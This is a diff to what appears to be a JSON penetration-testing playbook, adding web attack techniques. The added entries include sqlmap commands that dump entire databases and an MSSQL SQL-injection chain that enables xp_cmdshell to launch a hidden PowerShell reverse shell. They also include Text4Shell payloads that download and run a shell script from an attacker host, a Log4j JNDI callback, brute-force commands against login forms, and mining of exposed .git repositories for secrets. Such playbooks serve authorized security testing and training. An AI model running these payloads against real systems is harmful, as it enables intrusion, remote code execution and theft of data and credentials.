@@ -97,14 +97,40 @@
           ]
         },
         {
+          "id": "http_sqlmap",
+          "title": "SQLMap Automated Exploitation",
+          "description": "Automate injection point discovery and dumping once manual probing confirms a vulnerable form or parameter.",
+          "commands": [
+            "sqlmap -u http://{target_ip}/login.aspx --forms --crawl=2 --batch --dump-all",
+            "sqlmap -u 'http://{target_ip}/page.php?id=1' --dbs --batch",
+            "sqlmap -u 'http://{target_ip}/page.php?id=1' -D <database> -T <table> --dump"
+          ]
+        },
+        {
+          "id": "http_sqli_mssql_xp_cmdshell",
+          "title": "Blind SQLi to RCE (MSSQL xp_cmdshell Chain)",
+          "description": "When a login form is vulnerable to blind/time-based SQLi against an MSSQL backend (confirmed with WAITFOR DELAY), stack queries to enable and call xp_cmdshell for command execution. Base64-encode a PowerShell reverse shell for the final payload since quoting inside the injected string is limited.",
+          "commands": [
+            "'; WAITFOR DELAY '0:0:5'-- //",
+            "'; EXECUTE sp_configure 'show advanced options', 1;--",
+            "'; RECONFIGURE;--",
+            "'; EXECUTE sp_configure 'xp_cmdshell', 1;--",
+            "'; RECONFIGURE;--",
+            "'; EXECUTE xp_cmdshell 'whoami';--",
+            "'; EXECUTE xp_cmdshell 'powershell -nop -w hidden -e <base64_reverse_shell>';--"
+          ]
+        },
+        {
           "id": "http_git_dumper",
           "title": "Exposed .git Extraction",
-          "description": "If /.git is accessible, dump the repository locally and scan it for hardcoded secrets.",
+          "description": "If /.git is accessible, dump the repository locally and scan it for hardcoded secrets. gitleaks/git log -S won't catch everything, so also walk the full commit history manually — secrets are often removed in a later 'cleanup'/'security update' commit but still sit in an earlier one's diff.",
           "commands": [
             "python3 -m venv git-env && source git-env/bin/activate && pip install git-dumper",
             "git-dumper http://{target_ip}/.git ./git-repo",
             "cd git-repo && git log -S'http'",
-            "cd git-repo && gitleaks detect"
+            "cd git-repo && gitleaks detect",
+            "cd git-repo && git log --all --oneline",
+            "cd git-repo && git show <commit_hash>"
           ]
         },
         {
@@ -113,6 +139,28 @@
           "description": "Brute-force an HTTP POST login form. Adjust the URI path, username/password variables, and failure message string.",
           "commands": [
             "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target_ip} http-post-form \"/login.php:username=^USER^&password=^PASS^:Data error\""
+          ]
+        },
+        {
+          "id": "http_basic_auth_brute",
+          "title": "HTTP Basic Auth Brute-Forcing",
+          "description": "Distinct from a POST login form — a 401 response with a WWW-Authenticate header means credentials go in the request itself, not a form body. Check quickly with curl before scripting a brute-force.",
+          "commands": [
+            "curl -I http://{target_ip}/",
+            "curl -u admin:admin http://{target_ip}/",
+            "nmap --script http-brute -p 80 {target_ip}",
+            "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target_ip} http-get /"
+          ]
+        },
+        {
+          "id": "http_burp_intruder",
+          "title": "Burp Intruder Form Brute-Forcing",
+          "description": "Use when Hydra can't handle the form (CSRF token per request, session cookie required, non-standard failure condition). Capture the login request in Burp, send to Intruder, mark the password field as the payload position, and use 'Grep - Match' on the failure string to spot the one response that differs.",
+          "commands": [
+            "# Proxy the login POST through Burp, send to Intruder (Ctrl+I)",
+            "# Attack type: Sniper, payload position on the password parameter only",
+            "# Payloads tab: load users.txt or rockyou.txt as the payload list",
+            "# Options tab: Grep - Match on the known failure string (e.g. 'Data error') to filter successes"
           ]
         },
         {
@@ -130,6 +178,16 @@
           "description": "Test input fields or headers for Log4j vulnerability.",
           "commands": [
             "${jndi:ldap://<Kali_IP>:<Port>/o=reference}"
+          ]
+        },
+        {
+          "id": "http_text4shell",
+          "title": "Text4Shell (CVE-2022-42889) Probing",
+          "description": "Apache Commons Text <=1.9 evaluates string interpolation prefixes like 'script:' by default. Test any field that might be passed through StringSubstitutor, then chain to a download-and-execute RCE.",
+          "commands": [
+            "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+            "${script:javascript:java.lang.Runtime.getRuntime().exec('wget http://<Kali_IP>/shell.sh -O /tmp/shell.sh')}",
+            "${script:javascript:java.lang.Runtime.getRuntime().exec('bash /tmp/shell.sh')}"
           ]
         }
       ]
